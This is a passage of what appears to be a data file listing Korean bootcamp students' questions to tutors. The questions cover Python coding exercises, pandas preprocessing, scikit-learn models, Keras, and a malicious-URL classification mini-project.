(a % 2 == 1):\\n                    print(k)\\n                    break\\n                elif (a % 2 == 0):\\n                    k=k+1\\n                    continue\\n    break',\n","       '그러면 쉬는 시간에 원격 요청드려도 될까요?', '새로고침해서 재 입장 해봐도 똑같이 들어가지지 않습니다',\n","       '안녕하세요?\\n\\'Q7. train_test_split을 이용하여, train_x, test_x, train_y, test_y로 데이터 분리\" 하는 단계를 어떻게 진행해야 할지 몰라 계속 찾아보다가 질문드렸습니다.\\n\\n우선 지난 강의록을 참고해보니,\\n데이터 전처리 단계는\\n(1) 데이터를 x(독립변수),y(종속변수)로 분할\\n(2) train, validation, test로 분할\\n\\n이라고 알고 있습니다.\\n\\n위 단계를 수행하기 위해서는 분석 단위를 파악해야 하는데,\\n여기서는 \\'악성사이트 탐지\\'를 해야 하므로\\ntarget, 즉 y가 Result_v1이고,\\nx가 url_len ~ html_num_tags(\\'applet\\')으로 이해했는데 맞을까요?\\n\\n---\\n\\n그리고 (2) train, validation, test로 분할 단계를 수행하기 위해서는\\ntest_size와 train의 비율을 나눠야 하는데, 이 비율은 임의로 정해도 되는건지요?\\n본 데이터에서는 비율을 어떻게 해야 하는건지 잘 모르겠습니다.\\n\\n\\n지난주 결석으로 인해 수업을 듣지 못해 개념이 많이 헷갈려서 질문드렸습니다ㅜㅜ\\n늘 많은 도움 주셔서 감사합니다!!',\n","       '아예 -1과 1로 df[\"Result_v1\"]를 변경한 것이 조회도 안됩니다.. ㅠㅠ \\n왜 변경이 안되고 Nan으로 뜨는지 잘 모르겠습니다.. 코드 내용 첨부합니다\\n감사합니다.',\n","       '이 문제 코딩을 했는데  for문을 너무 많이써서 그런지 case 5번에서 계속 타임아웃이 납니다.. ㅠ\\n타임아웃이 나면 코드를 새로 짜야되는건지 궁금합니다.\\n그리고 제 코드를 첨부해드렸는데  연산시간을 줄일 수 있는 힌트 하나 살짝 주시면 감사하겠습니다...\\n이 문제 말고도 타임아웃이 나오는 문제가 몇 개 더 있어서 괴롭습니다 ..ㅠ \\n\\n',\n","       '상을 받는 학생이 없는 경우에는 무엇을 출력하면 될까요? 0 출력하면 될까요?',\n","       \"float(input().split('s')[0])\\nmap(int,input().split())\\nlist(input().split())\\nint(input()) \\n\\n이렇게 3개가 제가 코딩마스터스를 풀면서 input할 때 쓴 함수 들인데요.\\n\\n이 각각의 함수들의 쓰임새의 차이와\\n이 외에도 코딩 마스터스에서 자주 쓰는 입력 or 출력 함수들이 있다면 배우고 싶습니다!\\n\\n\\n\\n추가로 if (1\u0026lt;=A\u0026lt;=1000000000 and (x[-1]==0 or x[-1]==5)):는 제가 if에서 써본 것인데\\nA가 저범위에 들어오면서 리스트 x의 마지막 원소가 0or5가 되면! 이라는 조건을 걸고 싶은데\\n틀린 부분이 있다면 가르쳐주세요!\",\n","       '제 풀이 입니다.\\n\\nimport sys\\nN = int(input())\\nc = 0\\nd = 0\\nif(1\u0026lt;=N\u0026lt;=10):\\n    for i in range(1, N+1):\\n        a, b = map(int, input().split())\\n        if(a == 1):\\n            if(b==1):\\n                c=c\\n                d=d\\n            elif(b==2):    \\n                c=c\\n                d=d+1\\n            else:\\n                c=c+1\\n                d=d\\n        elif(a == 2):\\n            if(b==2):\\n                c=c\\n                d=d\\n            elif(b==3):    \\n                c=c\\n                d=d+1\\n            else:\\n                c=c+1\\n                d=d        \\n        elif(a == 3):\\n            if(b==3):\\n                c=c\\n                d=d\\n            elif(b==1):    \\n                c=c\\n                d=d+1\\n            else:\\n                c=c+1\\n                d=d      \\nprint(c,d)\\n\\n\\n근데 if문을 여러개 전개하는 과정이 너무 길어서 혹시 더 짧게할 수 있는 방법이 있다면 배우고 싶습니다.',\n","       '# -*- coding: utf-8 -*-\\nimport sys\\nN = int(input())\\nk = list(str(N))\\nk = k.count(\\'3\\')\\nif(1\u0026lt;=N\u0026lt;=1000):\\n    if(k==0):\\n        print(N)\\n    else:\\n        print(\"clap\"*k) \\n\\n제가 푼 답입니다.\\n오류는 없고 case4, 6에서 Failed가 발생하는데 어디가 문제를 일으키는지 잘 모르겠습니다 ㅠㅠㅠㅜ',\n","       '그냥 confusion matrix는 만들었는데 그림그리려고 하니까\\nax에 뭐가 들어가야되는지를 모르겠어서 질문드립니다.',\n","       \"train 데이터 전처리 하는 과정에서 중복치를 없애고 싶어서 \\ndf = df.drop_duplicates(['url_path_len', 'url_host_name'])\\n이런식으로 했는데 \\nKeyError: Index(['url_host_name'], dtype='object')\\n이런 오류가 뜹니다. 어떻게 해야하나요?\",\n","       'kaggle에 참여가 안되어서 문의드립니다..\\n\\nUser ID 11444692\\nUser Name jihoon0521 입니다..',\n","       '혹시 이번에 진행하는 미니프로젝트에 대한 코드를 나중에 프로젝트 끝나고 자료제공을 받을 수 있나요?',\n","       '그리고 다중공선성의 개념도 한번 더 설명부탁드립니다\\n!',\n","       \"print(ord('Z')),ord('a')\\n\\n# title 열 추가\\ntitanic['Name'].str.extract('([A-Za-z])\\\\.+')\\n\\n어떤 오류가 있어서 title 열 추가가 안되는건지 도움을 바랍니다.\",\n","       '제가 개인사정으로 지각을 해서 컴페티션 개요를 못들었는데\\n정확하게 무엇을 kaggle로 제출해야 하는건지 여쭤 볼 수 있을까요',\n","       '그러면 종속변수는 전처리 자체를 안 하나요??\\n', 'random_state을 왜 사용하는지 설명 부탁드립니다!',\n","       \"제출 잘 됐는지 확인하다가 잘못 보고\\n'미니프로젝트2차_개별실습' 에도 제출하고\\n'미니프로젝트2차_발표모임_2일차'에도 제출해버렸습니다.\\n괜찮나요?\",\n","       '# 모듈 불러오기\\nfrom sklearn.model_selection import train_test_split\\n\\n# 7:3으로 분리\\nx_train, x_test, y_train, y_test = train_test_split(x,y, test_size = 0.3, random_state = 2022)\\n\\n위와 같이 분리를 하는 과정에서 데이터를 지정해주지 않아도 자동으로 분리를 해주는데, 그렇다면 한번에 하나의 회귀분석 작업만을 수행해야 하는 걸까요?',\n","       'csv 파일 작성을 늦게 하여 Kaggle에 뒤늦게 올라갔는데 혹시 이 경우 테스트에는 어떻게 반영이 되나요....?\\n\\n어제 뒤늦게 올려서 late 제출로 작성되어 있어서 어떻게 되는지 궁금하여 여쭤봅니다.',\n","       '2.파란색 네모로 표시된 시리즈의 인덱스 값을 그래프를 그릴때 x축에 표시하고 싶습니다.\\nex) 현재 그래프에서는 0,1,2,3,4로 나오는데 저는 19,4,21 이렇게 나가고싶은데 어떻게하면될까요?',\n","       'case.2,3,6에서 실패를 하는데 코드에 어떤 문제가 있을까요?\\n특히 3번에서는 무한루프인 것 같은데 while문에 break  사용을 했는데 정지하지 않는 이유도 알고 싶습니다.',\n","       '2단계 선언에서 random_state 사용한 이유가 무엇인지 궁금합니다.\\n이미 데이터의 크기를 7 :3 분리할 때 random_state로 나누었는데 다시 한번더 하는 이유가 무엇인가요?',\n","       '아래 첨부한 파일처럼 몇 번을 다시 해봐도 그대로인데, 원격요청 드려도 될까요',\n","       '안녕하세요, 튜터님!\\n성능 평가 실습을 하다가, MSE와 RSME 관련해서 질문이 있습니다.\\n\\nincome - happiness 실습에서 MSE와 RSME를 뽑았는데,\\nMSE값은 0.45061240324267904,\\nRSME값은 0.671276696484154 으로 나왔습니다.\\n\\nMSE에 root 씌운 값이 RSME니까 값이 더 작아야 할 것 같은데, \\nRSME \u0026gt; MSE로 나와서 제가 어딘가 잘못한 것인지 문의드립니다...!\\n\\n아래에 제가 쓴 코드들 x,y분리 - 모델링 - 성능평가 첨부해드립니다.\\n감사합니다.',\n","       \"변수를 생성하려고 하는데 오류가 나서 문의 드립니다.\\n\\n코드 내용 : weather_21['time'] = pd.to_datetime(weather_21['일시'], format = '%Y%m%d%H')\\n오류 내용 : time data '2021-01-01 01:00' does not match format '%Y%m%d%H' (match)\\n\\n이럴 땐 어떻게 해야 하나요..?\",\n","       \"안녕하세요 튜터님!\\n\\n질문에 답해주셔서 감사합니다.\\nweater_21의 '일시'를 datetime으로 바꾸고, air_21 데이터셋에 적용해준 것처럼 1시간을 빼려고 합니다.(사진 참고)\\n하지만 '일시'는 object 타입이라 air_21에 적용한 방식으로는 적용이 불가하여, 먼저 datetime으로 바꿔줬습니다.\\n그런데 이렇게 했더니 datetime은 숫자 연산이 불가하다는 오류가 뜨는데..\\n\\n이런 경우 어떻게 해야 할까요?\\n\\n처음에 아래와 같은 식으로 적용했습니다.\\nweather_21['time'] = pd.to_datetime(weather_21['일시']-1, format='%Y%m%d%H')\\nweather_21['time'].plot.line(figsize=(20,8))\\nplt.show()\",\n","       \"air_21['time'] = pd.to_datetime(air_21['측정일시'], format = '%Y%m%d %H') 로 변환 해보고 unit값도 이것저것 줘 봐도 데이터가 1970-01-01 00:00:02.021100101이렇게 나옵니다,, format도 이것저것 해봐도 자료형은 datetime으로 변했지만 값이 1970년부터 시작하는걸로 나오는데 힌트 좀 주실 수 있으실까요,,?\",\n","       '조별토의 시간에 정확히 어떤 활동을 해야하는 건지 궁금해서 질문드립니다.\\n\\n서로 데이터 전처리한것을 비교하고 모델링 어떻게 진행할지 토의하면 될까요?\\n\\n아니면 모델링을 완성해야 할까요?',\n","       '길이 3의 연속하는 부분 수열이라는 의미가 정확히 무엇인가요? 예제 1의 예시로 들자면\\n해석 1) [4,9,7][9.7.6][7,6,9]\\n해석 2) [9,7,6] -\u0026gt; 이렇게 숫자들도 연속적으로 배열되어야 하는 조건인지 궁금합니다.\\n처음에는 2번으로 해석하고 풀었는데 1번으로 해석 했을 때 보다 정답률이 낮아서 고민입니다. 어느 쪽으로 생각해서 풀어야 하나요? 그리고 아래는 제 코드인데, 어느 부분이 오류인지 알려주시면 감사하겠습니다.\\n해석1)-------------------------------------------------\\n\\nr=[]\\nr2=[]\\nn = int(input())\\nnl = list(map(int, input().split()))\\nfor i in range(n):\\n    if i+2\u0026lt;=r[i][j]\u0026lt;=max(r[i]):\\n            r2.append(r[i][j])\\n            break\\nprint(max(r2))\\n\\n해석2)-------------------------------------------------\\n\\nr=[]\\nn = int(input())\\nnl = list(map(int, input().split()))\\nfor i in range(n):\\n    if i+2=nl[i+2]):\\n            r.append(nl[i+1])\\nprint(max(r))',\n","       'N, K = map(int,input().split()) # N: 학생 수, K: 학생 최댓값\\nstudents = list(map(int,input().split())) # 학생 점수\\n\\narray = [0]*N # 배열\\ntemp = min(students)-1 # 학셍 최솟값 -1\\nsum_temp = sum(array) # 0 초깃값\\nwhile True:\\n    max_g = max(students) # 학생 최댓값\\n    for i in range(len(students)): # 학생 수 만큼 반복\\n        if students[i] == max_g: # 최댓값 학생 1로 반환\\n            array[i] = 1 # 최댓값 위치 1로 반환\\n            students[i] = -1 # 최댓값 학생 -1로 반환, 최댓값이 바뀜\\n            if i == 0: # 첫번째라면 그 다음 위치를 1로 반환\\n                array[i+1] = 1\\n            elif i == N-1: # 마지막이라면 그 전 위치를 1로 반환\\n                array[i-1] = 1\\n            else: # 그 외 중앙값이라면 양 옆 1로 반환\\n                array[i+1] = 1\\n                array[i-1] = 1\\n\\n    if sum(array) \u0026gt; K: # 최댓값 후보 갯수가 k보다 클 경우, temp출력, 그리고 \\n        print(temp)\\n        break        \\n    if sum(array) == K: # 커트라인 이내 갯수가 k인 경우, 학생 최댓값 출력\\n        print(max_g)\\n        break\\n    if sum(array) \u0026gt; sum_temp: # 커트라인 이내 갯수가 초깃값보다 클테니 위 조건 불만족시 무조건 실행. array합, temp를 최댓값으로 설정\\n        sum_temp = sum(array)\\n        temp = max_g    \\n\\n위 경우 2번 케이스만 오류가 발생하는데, 2번 케이스가 무엇인지 알고 싶습니다. 코드리뷰도 부탁드립니다.',\n","       '아래와 같은 코드에서 어떤 부분이 오류인지 잘 모르겠습니다...\\n---------------------------\\nn,r = map(int,input().split())\\np=[]\\npx=[]\\npy=[]\\nb=[] #원 양의x값 가능한 경우 좌표\\nhx=[]#핫플(원) 중심 가능한 x좌표\\nhy=[]#중심 x 정해졌을때, 가능한 y좌표\\n\\nfor i in range(n):\\n    p.append(list(map(int,input().split())))\\n\\nfor x,y in p:\\n    px.append(x)\\n    py.append(y)\\n\\n#전체 원 가장자리 x좌표(최대) 될 수 있는 값\\nfor i in range(0,2*r): #범위는 원의 지름 길이\\n    if i - max(px) \u0026gt;= 0 : #x값들보다 원 지름이 더 큰 경우 -\u0026gt; 두 수의 차가 양수\\n        b.append(i) \\n\\n#원의 중심 hx좌표       \\nfor i in b: \\n    hx.append(i-r) # hx = b-r    \\n\\nfor i in range(len(p)): #피타고라스\\n    n = r - abs(p[i][0]-min(hx)) #가장 작은 x좌표부터 구함\\n    hy.append(n-p[i][1]) #원의 중심 hy좌표\\n\\nprint(min(hx),min(hy))',\n","       \"# Age 결측치를 Age 중앙값으로 채우기\\n#mean_age = data['Age'].median()\\n#data['Age'].fillna(mean_age, inplace = True)\\ndata['Age'].fillna(data['Age'].median, inplace = True)\\n\\n# 확인\\ndata.isna().sum()\\n\\n어느부분에서 문제가 생긴걸까요? 데이터 전처리에 문제가 있다고 하는데 \\ninfo로 알아보니 age만 object라고 나오네요 무슨 일일까요?\\n\\n\\nRangeIndex: 891 entries, 0 to 890\\nData columns (total 9 columns):\\n #   Column      Non-Null Count  Dtype  \\n---  ------      --------------  -----  \\n 0   Age         891 non-null    object \\n 1   SibSp       891 non-null    int64  \\n 2   Parch       891 non-null    int64  \\n 3   Fare        891 non-null    float64\\n 4   Pclass_2    891 non-null    uint8  \\n 5   Pclass_3    891 non-null    uint8  \\n 6   Sex_male    891 non-null    uint8  \\n 7   Embarked_Q  891 non-null    uint8  \\n 8   Embarked_S  891 non-null    uint8  \\ndtypes: float64(1), int64(2), object(1), uint8(5)\\nmemory usage: 32.3+ KB\",\n","       '제출 오류입니다.',\n","       'S = input()\\nsub = []\\nfor a in S:\\n  sub.append(a)\\n\\nfor i in sub:\\n  if i == \"\\\\\\\\\":\\n    S.replace(\\'\\\\\\\\\\', (\\'\\\\\\\\\\\\\\\\\\'))\\n  elif i == \"\\'\":\\n    S.replace(\"\\'\", (\"\\\\\\'\"))\\n  elif i == \\'\"\\':\\n    S.replace(\\'\"\\', (\\'\\\\\"\\'))\\n  else:\\n    pass\\n\\n\\nprint(S)\\n\\nreplace로도 시도했었는데 \\\\때문에 문제가 생기는 것 같습니다. \\\\\\\\를 넣어야 \\\\가 출력되는데 \\\\\\\\\\\\\\\\으로 대체한다고하니 \\\\가 6개가 출력됩니다',\n","       '과제 제출함 오류가 있어 혹시 몰라서 1:1 문의하기로 제출해 봅니다. 6조 과제 제출 합니다.',\n","       '실습에서 x라는 데이터를 선언된 model에 fitting하고\\nmodel.coef_로 값을 출력하면\\n출력되는 값들은 어떤 순서를 가지고 출력되나요? 아니면 무작위인가요?\\n\\nmodel.coef_ 값들을 x.columns와 대응해보고 싶어서 물어봅니다',\n","       '술래가 아닌 친구들끼리 터치했을 땐 아무일도 일어나지 않는다고 하여\\nappend하지 않은 것인데.\\n아무일도 일어나지 않는 것을 어떻게 고려하면 되는지 여쭤봐도 될까요?',\n","       'knn에서 범주형 변수는 거리로 수치화해야하는데 그 과정에서 knn의 알고리즘에 따라 거리를 표현해야하므로 \\n그대로 사용하는 것이 아닌 자카드 계수나 코사인 유사도를 이용하여 거리를 계산한다고 배웠었습니다. 그러면 이 값은 수치형으로 변환이되는데 이 값들도 강사님 답변에 따라 수치형을 정규화할 때 같이 해주는 것으로 이해해도 될까요? ',\n","       '2. 또한 선언하기 부분에서 model = KNeighborsClassifier() 는 선언을 해주었는데\\nconfusion_matrix, classification_report 이 부분에 대해선 선언을 왜 안해주는건지도 궁금합니다.',\n","       \"늘 답변 감사합니다!!\\n\\n저번에 문의를 했을때 이런 답을 받았었는데\\n\\nwhile문을 이용해 문제를 푸는 것이 맞으며, 에이블러님께서도 코드를 잘 짜주셨습니다.\\n다만 k = int(input()) 을 k = int()로 바꿔주시면 문제가 해결 될 것입니다.\\n\\n코드를 실행시켜보면 해당 부분에서 오류가 나는데, int()함수 내 문자열의 내용이 숫자가 아닌 경우라 변환이 되지 않고 에러가 난 것입니다.\\n\\n문자가 들어가서 숫자가 반환이 안된다고 하신것 같아 문자','를 없앤 후 다시 입력을 했는데 똑같이 결과가 안나와서 다시 문의드립니다.ㅜㅜ\\n\\nk = input().split(',')\\nk = ''.join(k)\\nk = int(k)\\nn = 0\\nwhile True:\\n    if (n \u0026gt; k) \u0026 (n % 2 == 0) \u0026 ((n / 2) % 2 == 1):\\n        print(n)\\n        break\\n    else:\\n        n += 1\\n        continue\\n\\n그리고 \\nk = int(input())   -\u0026gt;     k = int()  \\n이 말씀은 input()을 안 넣어도 원래 작동이 되나요??\",\n","       '가까운 거 3개 고르는데 x,y 범위가 달라서 판별하기 힘들다.\\n거리를 따져야 하는데 단위가 다르면 비교하기 힘드니까 단위를 맞춰주며 비교하자\\n정규화는 x,y 단위 동일하게 만들기이다.\\n\\n정규화 부분을 이렇게 이해했는데 맞는 걸까요??',\n","       '아무리 눌러도 다운로드가 안되네요 ㅜ 파일 좀 주실 수 있나요?',\n","       'AI모델 해석,평가_0904.pdf    [교안 다운로드] 버튼 누르면 뷰페이지만 보이고 다운로드가 안됩니다,,ㅠ,ㅠㅠ',\n","       'KNN scatter 그래프에서 x,y축의 값이 많이 차이 날 때 정규화를 사용하여 성능 향상을 꾀한다면 \\n사실상 x,y축의 0~1까지의 비율로 바뀌는 것이기에 각 축의 값이 비슷하거나 매우 차이가 크더라도 문제가 생기지 않으므로 안정적인 값 도출을 위해 정규화를 사실상 필수적으로 사용해주는 편이 맞다고 보면 될까요?',\n","       'Marital Status가 Married Single Divorced로 영문으로 나와있는데\\n가변수화 했을때 어떤게 0 이고 어떤게 1인지 어떻게 알 수 있나요?\\ny축에서 0과 1이라는 숫자로만 나와있는데 세범주를 가변수화 해서 어떻게 0과 1사이에 녹일 수 있는지 잘 이해가 안됩니다...\\n0에는 Single Divorced가 들어가고 1에는 Married가 들어가는건가요?왜그렇게 배치가 되는건가요?ㅜ 그리고 0에 두개의 변수가 들어가있어도 되는건가요?',\n","       '예를 들어서 \\n죽은 사람 5명 산사람 5명 -\u0026gt; 지니불순도 0.5\\n\\n염산 먹은 사람 기준으로 죽은 사람 산사람 분리했더니 지니불순도 0이 나옴 -\u0026gt; 염산으로 나누는 기준이 유효했음 확인\\n\\n물 마신 사람 기준으로 죽은 사람 산사람 분리했더니 지니 불순도 그대로 0.5 나옴 -\u0026gt; 물 마시는 건 죽음에 연관 없음\\n\\n이렇게 해서 결론은 지니 불순도 차이가 많이 나면 좋다 라고 이해하면 될까요?',\n","       'merge함수는 몇개까지 들고와서 병합시킬수 있을까요??',\n","       \"result = xml_dict['response']['body']['items']['item']  \\n여기서 items, item의 각각 의미가 뭘까요..?\\n전부 key값인 건 이해가 가는데 정확히 뭘 의미하는지를 모르겠습니다...!\",\n","       'explainer_1=shap.TreeExplainer(model)\\nshap_value_1=explainer_1.shap_values(x_train)\\n\\n\\n하고\\nshap_value_1[0]을 출력하면\\narray([[ 0.0119589 ,  0.20830586, -0.00621283, ...,  0.02614259,\\n         0.0006485 ,  0.00107624],\\n       [ 0.03425428,  0.05078045, -0.01579821, ..., -0.00568985,\\n         0.0005222 ,  0.00045328],\\n       [-0.03630828,  0.02205853,  0.06141142, ...,  0.00563219,\\n         0.00248413,  0.00200689],\\n       ...,\\n       [-0.03999309, -0.02568411, -0.04185704, ..., -0.00336687,\\n         0.00061704,  0.00075396],\\n       [-0.05779475, -0.01196081, -0.02133825, ...,  0.0064338 ,\\n         0.00074789,  0.00041238],\\n       [ 0.06048488, -0.0149657 , -0.02243043, ...,  0.00543337,\\n         0.00042802,  0.00021065]])\\n가 나옵니다',\n","       '가변수화한  feature 에 대한 변수 중요도는 어떻게 해석해야할까요\\n새로 생성된 변수로 봐야할 것 같은데 어떻게 해석해야할지 떠올리기 어렵습니다\\n\\n강사님 설명을 들어도 명확히 이해가 되지 않습니다.',\n","       \"오늘 수업에서 전처리리뷰에 추가 7 로 하셨던 기타 - 딕셔너리 활용에서\\n\\n# 딕셔너리 선언\\nmydic = {'response':{'body':{'items':[{'name':'hong','age':20}, {'name':'jiemae', 'age':25}]}}}\\n\\n#확인\\nmydic\\n\\n# 데이터 조회\\nmydata = mydic['response']['body']['items']['item']\\n\\n# 확인\\nmydata\\n\\n로 돌렸을때, 강사님은 값이 나오시던데 저는\\n---------------------------------------------------------------------------\\nTypeError                                 Traceback (most recent call last)\\n in \\n      1 # 데이터 조회\\n----\u0026gt; 2 mydata = mydic['response']['body']['items']['item']\\n      3 \\n      4 # 확인\\n      5 mydata\\n\\nTypeError: list indices must be integers or slices, not str\\n\\n이러한 오류가 뜨면서 실행되지 않습니다 ㅠㅠ! \",\n","       'DT 1번 모형에서 Gender_Male\u0026lt;=0.5 인 경우\\n0인경우 왼쪽 , 1인경우 오른쪽이 되는 것은 이해했습니다\\n그런데 0이 그러면 Male이 아닌 경우가 되는 것이고\\n1이 Male인 경우가되는 것인지요?\\n만약 직무만족도라고 했을 경우\\nSatisfaction_4 \u0026lt;=0.5 로 나눠질 경우\\n왼쪽이 0, 오른쪽이 1이고\\n왼쪽은 만족도가 4가 아닌경우(1,2,3 전부 다 )\\n오른쪽은 만족도가 4인 경우로 해석이 되는 건가요?',\n","       '안녕하세요, AIDU에서 딥러닝 모델을 학습시키려 하는데 문제가 발생하여 문의드립니다. pytorch로 모델을 생성하였는데, 현재 이를 이용해서 모델을 학습시키면 torch 모듈이 없어 학습에 실패하는 문제가 발생합니다. 혹시 플랫폼 내에서 torch 모듈을 사용할 수 있는 방법이 없을까요? 또한 pytorch로 학습을 진행할 수 있도록 추가로 지원을 진행할 계획이 있는지도 궁금합니다. ',\n","       '예측값은 0~1의 값으로 나오게 되는데 어느 구간만큼 0이나 1로 처리하는지 cutoff를 어떻게 설정하나요? 기본값은 0.5일까요?',\n","       \"아래와 같이 오류가 발생했습니다.\\n\\n---------------------------------------------------------------------------\\nTypeError                                 Traceback (most recent call last)\\n in \\n      7   # n_iter=20\\n      8   # scoring='r2'\\n----\u0026gt; 9 model = RandomizedSearchCV(model_dt, # 기본 모델 이름\\n     10                           params, # 파라미터 범위\\n     11                           cv=10, # Cross Validation 분할 개수\\n\\nTypeError: __init__() got an unexpected keyword argument 'n_inter'\\n\\n\\n# 파라미터 선언\\n  # max_depth: 1~50\\nparams = {'max_depth': range(1,51)}\\n\\n# Random Search 선언\\n  # cv=5\\n  # n_iter=20\\n  # scoring='r2'\\nmodel = RandomizedSearchCV(model_dt, # 기본 모델 이름\\n                          params, # 파라미터 범위\\n                          cv=10, # Cross Validation 분할 개수\\n                          n_inter=20,\\n                          scoring='r2')\\n\\n코드는 위와 같습니다.\",\n","       'RandomizedSearchCV에서 내부적으로 cross_val_score를 돌려서 c2_score를 각각 추출할 필요가 없다고 기억합니다!\\n그 말씀이 파라미터 선언할 때 모든 모델링 알고리즘의 매개변수를 모두 넣어서 최고 성능을 가지는 파라미터를 추출하고, 해당 파라미터를 사용하는 모델을 선택하면 된다는 말씀인가요??',\n","       \" 'min_samples_split' 파라미터가 무엇을 의미하는지 잘 이해하지 못했습니다ㅜㅜ\",\n","       '# 데이터 학습\\nmodel.fit(x, y, epochs=10, verbose=1)\\n위에 것을 실행하면 \\n\\nValueError: Unknown loss function: categorical)crossentropy. Please ensure this object is passed to the `custom_objects` argument. See https://www.tensorflow.org/guide/keras/save_and_serialize#registering_the_custom_object for details.\\n위와 같은 오류가 뜹니다. 무엇이 문제일까요?',\n","       '제가 잠시 화장실 다녀와서요 ㅠㅠ argmax 설명 다시 부탁드려도 괜찮을까요?',\n","       'keras.backend.clear_session()\\n\\nmodel = keras.models.Sequential()\\n\\nmodel.add(keras.layers.Input(shape=(4,)))\\nmodel.add(keras.layers.Dense(3, activation=\"softmax\")\\nmodel.compile(loss=\\'categorical_crossentropy\\', metrics=[\"accuracy\"], optimizer=\"adam\")\\n\\n\\n이코드에 \\n\\n  File \"\", line 7\\n    model.compile(loss=\\'categorical_crossentropy\\', metrics=[\"accuracy\"], optimizer=\"adam\")\\n        ^\\nSyntaxError: invalid syntax\\n이런 오류가 계속 뜹니다.. ㅠㅠ',\n","       \"# 파라미터 선언\\n  # n_neighbors: range(3, 21)\\nparams = {'max_depth' : range(1, 5)}\\n\\n# Random Search 선언\\n  # cv=5\\n  # scoring='accuracy'\\nmodel = GridSearchCV(model_dt,\\n                     params,\\n                     cv=5,\\n                     scoring='accuracy') \\n\\n여기에서 n_iter=10가 왜 없는지 듣고싶습니다.\\n\\n\\n그리고 만약 이게 random Search인 경우 cv=5, n_iter=10이면\\n5개로 분할하여 2번씩 돌려 n_iter=10을 만족한다고 이해해도 될까요?\",\n","       '안녕하세요!\\n다름이 아니라 뱃지 진행상황을 확인했는데 미세먼지 예측 뱃지가 부여가 안되어 있는 것을 확인했습니다..!\\n같은 조였던 분들은 부여가 되었는데 저는 부여가 안되어 있어 혹시 누락이 된 것인지.. 부여가 안된 이유가 있는 것인지 여쭤보려고 합니다!\\nA023124 입니다!\\nhttps://docs.google.com/spreadsheets/u/0/d/1RYziPIzBlzXrJrSz5Yb1oC82t5GRC2LRFeH30EnxXVI/htmlview#gid=0\\n',\n","       '2. train/test set 크기\\n실제로 실무 프로젝트를 진행할 때 데이터의 양이 어느정도 되나요? 데이터를 수집하는 것부터 시작하는 프로젝트의 경우 데이터가 많이 모이기 힘든 경우도 있을 것 같은데, train set의 양이 적어도 괜찮은가요? train set의 양이 많으면 많을수록 좋은 것인지, 적어도 유의미하다고 생각하고 모델을 만드는지 ( 적은 경우, 모델 성능에는 문제가 없는지 )가 궁금합니다! 그리고 test set의 데이터 양은 예측과는 상관이 없나요?? 많을수록 좋은 건가요??\\n\\n\\n감사합니다.',\n","       '투표로 고름\\n→ 투표 수 같아도 가중치로 갈릴 수 있음\\n\\n이라고 하셨는데요,\\n만약에 예를 들면 가중치가 둘 다 0.5고, 투표수가 같으면 어떻게 될까요...?\\n그래도 답은 하나가 나올까요...?\\n\\n그리고 예를 들어서 투표수는 a, b 중에서 a가 7, b가 3으로 a가 더 많이 표를 얻었는데 \\n가중치가 a는 0.2, b가 0.8 이러면 어떻게 될까요??',\n","       '현재 보스턴데이터를 이용하여 히든레이어를 추가하고있습니다.\\n히든레이어의 노드수를 32개로 설정하였습니다. 보스턴 데이터는 피쳐수가 13인것으로 알고있는데 \\n히든레이어의 노드에는 32개가 들어가게된다면 어떤 특성을 가지고있는 노드들인지 궁금합니다 \\n',\n","       '만약에 분류 종류가 train 에서는 A,B,C가 존재하고 test에서는 A,B,D 가 존재하면 모델링했을 때 노드수는 같으므로 C와 D와 서로 다름에도 같다고 분류할 것 같은데 이 때는 전처리를 어떻게 진행하면 되나요??',\n","       \"디시전트리를 활용한 회귀 문제 풀이에 궁금증이 있습니다. 분류문제 풀이의 경우 'a, b, c 패턴이 있는 데이터는 결과값이 A'라는 학습을 마친 뒤 비슷한 패턴의 데이터를 A로 분류하는 것으로 이해했습니다.\\n\\n그런데 이를 이용한 회귀 문제 풀이에 궁금증이 있습니다. 선형 회귀 모델의 경우에는 (x, y) = (1, 10), (2, 20), (3, 30) 데이터가 입력되면, 완전히 동떨어진 데이터 10000이 입력되더라도 100000를 출력 값으로 도출할 수 있습니다. 그런데 디시전트리나 KNN의 경우는 기존 학습데이터와 완전히 동떨어진 10000이 입력되었을 때 100000를 예측할 수 있는 걸까요? 지금 이해하기로는 10, 20, 30 중 가장 비슷한 30을 결과값으로 내지 않을까 의심하고 있습니다. \",\n","       '머신러닝 시간에 x feature들의 가변수화는(이미지 첨부)\\n1.  train/test 분리\\n2.  x,y 분리\\n3.  x feature들의 가변수화\\n4. train/validation 분리 라고 배웠는데요.\\n\\n이번 딥러닝 시간에서는\\n1. train/test 분리\\n2. train/validation 분리\\n3. y값 가변수화\\n이렇게 알려주셨잖아요.\\n\\n그럼 이걸 정리하면..\\n1. train/test 분리\\n2. x, y 분리\\n3. x feature들의 가변수화\\n4. train/validation 분리\\n5. y값 가변수화\\n\\n이렇게 이해해야 하나요..? 헷갈립니다..',\n","       '이진분류 문제의 경우 : [0] or [1] 결국 0 또는 1의 결과를 하나의 feature에서 구분 가능하기 때문에 1을 사용합니다.\\n\\n ex) 암인가 아닌가를 분류 한다면 암이면 1 아니면 0이기 때문에 하나의 feature에서 구분가능합니다\\n\\n---------------------------------------------------------------------------------------\\n보내주신 답변 감사합니다.  \\n\\n그렇다면 iris에서는 3개의 붓꽃으로 분류하는 문제로 알고 있습니다. \\n\\n그런데  어째서 keras.layers.Dense(2, activation = \"softmax\") 가 아니라 keras.layers.Dense(3, activation = \"softmax\")가 되는 건가요? \\n\\n\\n',\n","       '강사분이 학습이 잘 되었다고 가정한 데이터 셋에서, 노드의 유용성을 성능과 설명으로 나누어서 설명해주셨는데요.\\n그래서 결론이 히든 레이어를 넣으면 노드의 성능의 유용성은 증가하고 설명상의 유용성은 낮아진다는 뜻인가요..? 그래서 히든레이어는 도대체 무엇인가요..?',\n","       '6-1에서는 model.fit()로 하다가\\n6-2부터는 cv_score를 썼는데\\n실제로는 cv_score를 더 많이 쓸까요...?',\n","       \" 2_2_ANN_MNIST 실습에서 MinMaxScaler을 통한 스케일링이 안되기 때문에 직접 스케일링을\\n진행하셨는데, 아래 코드를 실행시키니까 스케일링이 잘 실행됐습니다.. 혹시 강사님께서 다른 이유로\\n직접 스케일링을 하는 것을 보여주신 건데 제가 잘 못 이해한 건지 궁금합니다ㅜ\\nfrom sklearn.preprocessing import MinMaxScaler\\n\\nscaler = MinMaxScaler()\\ntrain_x_s = scaler.fit_transform(train_x)\\nprint(f'max : {train_x_s.max()} / min : {train_x_s.min()}')\",\n","       '예전에 에이블 스쿨 예습관련해서 질문드려, 할 수 있는 링크들을 받았습니다\\n기억으로는 